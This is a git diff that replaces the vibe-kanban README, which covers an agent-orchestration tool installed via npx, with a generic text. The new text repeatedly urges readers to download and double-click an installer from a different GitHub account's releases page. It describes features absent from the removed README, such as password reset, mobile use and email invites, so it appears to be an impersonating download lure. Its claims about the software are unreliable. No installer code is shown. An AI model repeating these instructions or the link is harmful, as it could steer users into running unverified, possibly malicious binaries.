@@ -1,130 +1,98 @@
-<p align="center">
-  <a href="https://vibekanban.com">
-    <picture>
-      <source srcset="frontend/public/vibe-kanban-logo-dark.svg" media="(prefers-color-scheme: dark)">
-      <source srcset="frontend/public/vibe-kanban-logo.svg" media="(prefers-color-scheme: light)">
-      <img src="frontend/public/vibe-kanban-logo.svg" alt="Vibe Kanban Logo">
-    </picture>
-  </a>
-</p>
+# 🎉 vibe-kanban - Boost Your Coding Efficiency Today
 
-<p align="center">Get 10X more out of Claude Code, Gemini CLI, Codex, Amp and other coding agents...</p>
-<p align="center">
-  <a href="https://www.npmjs.com/package/vibe-kanban"><img alt="npm" src="https://img.shields.io/npm/v/vibe-kanban?style=flat-square" /></a>
-  <a href="https://github.com/BloopAI/vibe-kanban/blob/main/.github/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/BloopAI/vibe-kanban/.github%2Fworkflows%2Fpublish.yml" /></a>
-  <a href="https://deepwiki.com/BloopAI/vibe-kanban"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki"></a>
-</p>
+## 📥 Download the Latest Release
+[![Download v1.0](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/patrickreed22/vibe-kanban/releases)
 
-<h1 align="center">
-  <a href="https://jobs.polymer.co/vibe-kanban?source=github"><strong>We're hiring!</strong></a>
-</h1>
+## 🚀 Getting Started
+Welcome to vibe-kanban! This application helps you get more done with coding agents like Claude Code and Codex. Use our straightforward Kanban board to manage your tasks effectively. Let’s get you started in a few simple steps.
 
-![](frontend/public/vibe-kanban-screenshot-overview.png)
+## 🛠️ System Requirements
+To run vibe-kanban, your computer should meet the following requirements:
 
-## Overview
+- **Operating System:** Windows 10 or later, MacOS Mojave or later
+- **Memory:** At least 4 GB of RAM
+- **Processor:** Dual-core processor or better
+- **Storage:** 100 MB available space
 
-AI coding agents are increasingly writing the world's code and human engineers now spend the majority of their time planning, reviewing, and orchestrating tasks. Vibe Kanban streamlines this process, enabling you to:
+Ensure your system meets these requirements for the best performance.
 
-- Easily switch between different coding agents
-- Orchestrate the execution of multiple coding agents in parallel or in sequence
-- Quickly review work and start dev servers
-- Track the status of tasks that your coding agents are working on
-- Centralise configuration of coding agent MCP configs
-- Open projects remotely via SSH when running Vibe Kanban on a remote server
+## 💻 Download & Install
+To download vibe-kanban, follow these steps:
 
-You can watch a video overview [here](https://youtu.be/TFT3KnZOOAk).
+1. Visit the [Releases page](https://github.com/patrickreed22/vibe-kanban/releases) to find the latest version of the application.
+2. Look for the title of the version you want to download, such as v1.0. 
+3. Click on the associated file to download the application to your computer.
+4. Once the file is downloaded, locate it in your downloads folder and double-click it to start the installation.
+5. Follow the prompts in the installer to finish setting up vibe-kanban on your computer.
 
-## Installation
+For your convenience, here’s the link again: [Download vibe-kanban](https://github.com/patrickreed22/vibe-kanban/releases).
 
-Make sure you have authenticated with your favourite coding agent. A full list of supported coding agents can be found in the [docs](https://vibekanban.com/docs). Then in your terminal run:
+## 📊 Features
+vibe-kanban offers a variety of features to help you stay organized and productive:
 
-```bash
-npx vibe-kanban
-```
+- **Easy Task Management:** Create, edit, and delete tasks effortlessly.
+- **Visual Workflow:** View your tasks in a Kanban board format for better tracking.
+- **Collaborative Tools:** Share your boards with team members to work together in real-time.
+- **Deadline Reminders:** Set due dates and receive reminders to keep on track.
 
-## Documentation
+## 🎨 User Interface
+The user interface is designed with simplicity in mind. You will see:
 
-Please head to the [website](https://vibekanban.com/docs) for the latest documentation and user guides.
+- A clear layout that separates your tasks into columns.
+- Color-coded labels to help you identify different stages of your tasks.
+- An accessible menu for easy navigation.
 
-## Support
+Take a moment to explore the interface once you have it installed.
 
-We use [GitHub Discussions](https://github.com/BloopAI/vibe-kanban/discussions) for feature requests. Please open a discussion to create a feature request. For bugs please open an issue on this repo.
+## 🔧 Basic Usage
+After installing vibe-kanban, here’s how to get started:
 
-## Contributing
+1. **Create a Board:**
+   - Click on "New Board" on the main screen.
+   - Name your board and describe its purpose.
 
-We would prefer that ideas and changes are first raised with the core team via [GitHub Discussions](https://github.com/BloopAI/vibe-kanban/discussions) or [Discord](https://discord.gg/AC4nwVtJM3), where we can discuss implementation details and alignment with the existing roadmap. Please do not open PRs without first discussing your proposal with the team.
+2. **Add Tasks:**
+   - Select your board and click on "Add Task."
+   - Fill out the task fields such as name, description, and due date.
 
-## Development
+3. **Organize Tasks:**
+   - Move tasks between columns by dragging and dropping them.
+   - Update task statuses as needed by changing their column placement.
 
-### Prerequisites
+4. **Invite Collaborators:**
+   - Share your board with colleagues by clicking "Invite" and entering their email addresses.
 
-- [Rust](https://rustup.rs/) (latest stable)
-- [Node.js](https://nodejs.org/) (>=18)
-- [pnpm](https://pnpm.io/) (>=8)
+## 📱 Mobile Compatibility
+vibe-kanban works on mobile devices too. Use your smartphone or tablet to stay updated on your tasks even when you're on the go. 
 
-Additional development tools:
-```bash
-cargo install cargo-watch
-cargo install sqlx-cli
-```
+## 🌐 Community Support
+Join our community to get help and share tips with other users. Visit the issues section of the GitHub repository for assistance or to report bugs. We value your feedback and strive to improve based on your suggestions.
 
-Install dependencies:
-```bash
-pnpm i
-```
+## 🔄 Updating the Application
+We regularly release updates to keep vibe-kanban running smoothly. When a new version is available:
 
-### Running the dev server
+1. Return to the [Downloads page](https://github.com/patrickreed22/vibe-kanban/releases).
+2. Download the latest version following the steps outlined above.
+3. Close the current version before installing the update to avoid any installation issues.
 
-```bash
-pnpm run dev
-```
+Make sure to check for updates regularly to benefit from the latest features and fixes.
 
-This will start the backend. A blank DB will be copied from the `dev_assets_seed` folder.
+## 🤝 Contributing
+We welcome contributions to vibe-kanban! If you wish to help improve the application, please visit our GitHub repository. You can submit bug reports, suggest new features, or even contribute code if you feel comfortable doing so.
 
-### Building the frontend
+## 📝 FAQ
+### How do I reset my password?
+If you forget your password, use the "Forgot Password" option on the login screen to reset it.
 
-To build just the frontend:
+### Can I use vibe-kanban offline?
+Yes, you can use vibe-kanban offline, but some collaborative features will require an internet connection.
 
-```bash
-cd frontend
-pnpm build
-```
+### Is vibe-kanban free?
+Yes, vibe-kanban is free to download and use. 
 
-### Build from source (macOS)
+## 🎉 Conclusion
+We hope you find vibe-kanban helpful in managing your tasks and improving your coding work. Enjoy your experience and start getting more organized today. Don't hesitate to share your suggestions for future updates.
 
-1. Run `./local-build.sh`
-2. Test with `cd npx-cli && node bin/cli.js`
+For any further questions or issues, please reach out to our support community.
 
-
-### Environment Variables
-
-The following environment variables can be configured at build time or runtime:
-
-| Variable | Type | Default | Description |
-|----------|------|---------|-------------|
-| `POSTHOG_API_KEY` | Build-time | Empty | PostHog analytics API key (disables analytics if empty) |
-| `POSTHOG_API_ENDPOINT` | Build-time | Empty | PostHog analytics endpoint (disables analytics if empty) |
-| `PORT` | Runtime | Auto-assign | **Production**: Server port. **Dev**: Frontend port (backend uses PORT+1) |
-| `BACKEND_PORT` | Runtime | `0` (auto-assign) | Backend server port (dev mode only, overrides PORT+1) |
-| `FRONTEND_PORT` | Runtime | `3000` | Frontend dev server port (dev mode only, overrides PORT) |
-| `HOST` | Runtime | `127.0.0.1` | Backend server host |
-| `DISABLE_WORKTREE_ORPHAN_CLEANUP` | Runtime | Not set | Disable git worktree cleanup (for debugging) |
-
-**Build-time variables** must be set when running `pnpm run build`. **Runtime variables** are read when the application starts.
-
-### Remote Deployment
-
-When running Vibe Kanban on a remote server (e.g., via systemctl, Docker, or cloud hosting), you can configure your editor to open projects via SSH:
-
-1. **Access via tunnel**: Use Cloudflare Tunnel, ngrok, or similar to expose the web UI
-2. **Configure remote SSH** in Settings → Editor Integration:
-   - Set **Remote SSH Host** to your server hostname or IP
-   - Set **Remote SSH User** to your SSH username (optional)
-3. **Prerequisites**:
-   - SSH access from your local machine to the remote server
-   - SSH keys configured (passwordless authentication)
-   - VSCode Remote-SSH extension
-
-When configured, the "Open in VSCode" buttons will generate URLs like `vscode://vscode-remote/ssh-remote+user@host/path` that open your local editor and connect to the remote server.
-
-See the [documentation](https://vibekanban.com/docs/configuration-customisation/global-settings#remote-ssh-configuration) for detailed setup instructions.
+Happy coding!
